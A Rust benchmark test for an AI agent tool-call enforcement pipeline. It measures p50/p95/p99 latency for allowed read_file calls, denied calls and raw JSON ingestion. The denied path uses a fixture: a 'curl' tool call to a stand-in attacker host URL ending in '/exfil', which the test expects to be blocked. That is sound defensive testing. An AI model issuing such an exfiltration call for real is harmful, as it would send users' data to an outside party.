// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2026 Arthur Lin (carbon-evolution)

//! Task 3 Latency Overhead Benchmark:
//! Measures the throughput and latency overhead (p50, p95, p99) of the
//! enforcement pipeline (`run_enforcement_pipeline` and `execute_raw_json`).

use serde_json::json;
use soup_wall_adapter::{
    execute_raw_json, run_enforcement_pipeline, MockExecutor, ToolCallEvent, Verdict,
};
use std::time::Instant;

#[test]
fn test_enforcement_pipeline_latency_benchmark() {
    let executor = MockExecutor::new();
    let iterations = 1000;

    // 1. Benchmark Benign Allowed Execution
    let mut benign_latencies_us = Vec::with_capacity(iterations);
    let start_total = Instant::now();

    for i in 0..iterations {
        let mut benign_event = ToolCallEvent::new(
            format!("call-{i}"),
            "session-1",
            "read_file",
            json!({"path": "/workspace/config.toml"}),
        );

        let t0 = Instant::now();
        let receipt = run_enforcement_pipeline(&mut benign_event, &executor);
        let elapsed_us = t0.elapsed().as_micros();
        benign_latencies_us.push(elapsed_us);

        assert_eq!(receipt.verdict, Verdict::Allow);
        assert!(receipt.executed);
    }

    let benign_total_duration = start_total.elapsed();
    assert_eq!(executor.count(), iterations);

    benign_latencies_us.sort_unstable();
    let p50_benign = benign_latencies_us[iterations * 50 / 100];
    let p95_benign = benign_latencies_us[iterations * 95 / 100];
    let p99_benign = benign_latencies_us[iterations * 99 / 100];
    let avg_benign = benign_latencies_us.iter().sum::<u128>() as f64 / iterations as f64;
    let throughput_benign = iterations as f64 / benign_total_duration.as_secs_f64();

    println!(
        "\n=== Benign Allowed Execution Benchmark ({} iterations) ===",
        iterations
    );
    println!("  Total time:       {:?}", benign_total_duration);
    println!("  Throughput:       {:.0} ops/sec", throughput_benign);
    println!("  Average latency:  {:.2} µs", avg_benign);
    println!("  p50 latency:      {} µs", p50_benign);
    println!("  p95 latency:      {} µs", p95_benign);
    println!("  p99 latency:      {} µs", p99_benign);

    assert!(
        p95_benign < 500,
        "p95 latency of benign calls should be under 500 µs, got {} µs",
        p95_benign
    );

    // 2. Benchmark Blocked / Denied Execution (Fail-Closed Path)
    let mut blocked_latencies_us = Vec::with_capacity(iterations);
    let start_blocked = Instant::now();

    for i in 0..iterations {
        let mut blocked_event = ToolCallEvent::new(
            format!("call-{i}"),
            "session-1",
            "curl",
            json!({"url": "https://attacker.example.com/exfil"}),
        );

        let t0 = Instant::now();
        let receipt = run_enforcement_pipeline(&mut blocked_event, &executor);
        let elapsed_us = t0.elapsed().as_micros();
        blocked_latencies_us.push(elapsed_us);

        assert_eq!(receipt.verdict, Verdict::Deny);
        assert!(!receipt.executed);
    }

    let blocked_total_duration = start_blocked.elapsed();
    // Executor count should still be unchanged (calls never reach executor)
    assert_eq!(executor.count(), iterations);

    blocked_latencies_us.sort_unstable();
    let p50_blocked = blocked_latencies_us[iterations * 50 / 100];
    let p95_blocked = blocked_latencies_us[iterations * 95 / 100];
    let p99_blocked = blocked_latencies_us[iterations * 99 / 100];
    let avg_blocked = blocked_latencies_us.iter().sum::<u128>() as f64 / iterations as f64;
    let throughput_blocked = iterations as f64 / blocked_total_duration.as_secs_f64();

    println!(
        "\n=== Blocked/Denial Execution Benchmark ({} iterations) ===",
        iterations
    );
    println!("  Total time:       {:?}", blocked_total_duration);
    println!("  Throughput:       {:.0} ops/sec", throughput_blocked);
    println!("  Average latency:  {:.2} µs", avg_blocked);
    println!("  p50 latency:      {} µs", p50_blocked);
    println!("  p95 latency:      {} µs", p95_blocked);
    println!("  p99 latency:      {} µs", p99_blocked);

    assert!(
        p95_blocked < 500,
        "p95 latency of blocked calls should be under 500 µs, got {} µs",
        p95_blocked
    );

    // 3. Benchmark Raw JSON Ingestion & Validation
    let raw_payload = r#"{
        "contract_version": "sw-tool-event/0.1",
        "call_id": "call-json-bench",
        "session_id": "sess-json-bench",
        "tool_name": "read_file",
        "raw_arguments": {"path": "/etc/hosts"}
    }"#;

    let mut json_latencies_us = Vec::with_capacity(iterations);
    let start_json = Instant::now();

    for _ in 0..iterations {
        let t0 = Instant::now();
        let receipt = execute_raw_json(raw_payload, &executor);
        let elapsed_us = t0.elapsed().as_micros();
        json_latencies_us.push(elapsed_us);

        assert_eq!(receipt.verdict, Verdict::Allow);
        assert!(receipt.executed);
    }

    let json_total_duration = start_json.elapsed();
    json_latencies_us.sort_unstable();
    let p50_json = json_latencies_us[iterations * 50 / 100];
    let p95_json = json_latencies_us[iterations * 95 / 100];
    let p99_json = json_latencies_us[iterations * 99 / 100];
    let avg_json = json_latencies_us.iter().sum::<u128>() as f64 / iterations as f64;
    let throughput_json = iterations as f64 / json_total_duration.as_secs_f64();

    println!(
        "\n=== Raw JSON Parsing + Enforcement Benchmark ({} iterations) ===",
        iterations
    );
    println!("  Total time:       {:?}", json_total_duration);
    println!("  Throughput:       {:.0} ops/sec", throughput_json);
    println!("  Average latency:  {:.2} µs", avg_json);
    println!("  p50 latency:      {} µs", p50_json);
    println!("  p95 latency:      {} µs", p95_json);
    println!("  p99 latency:      {} µs", p99_json);

    assert!(
        p95_json < 500,
        "p95 latency of raw JSON path should be under 500 µs, got {} µs",
        p95_json
    );
}
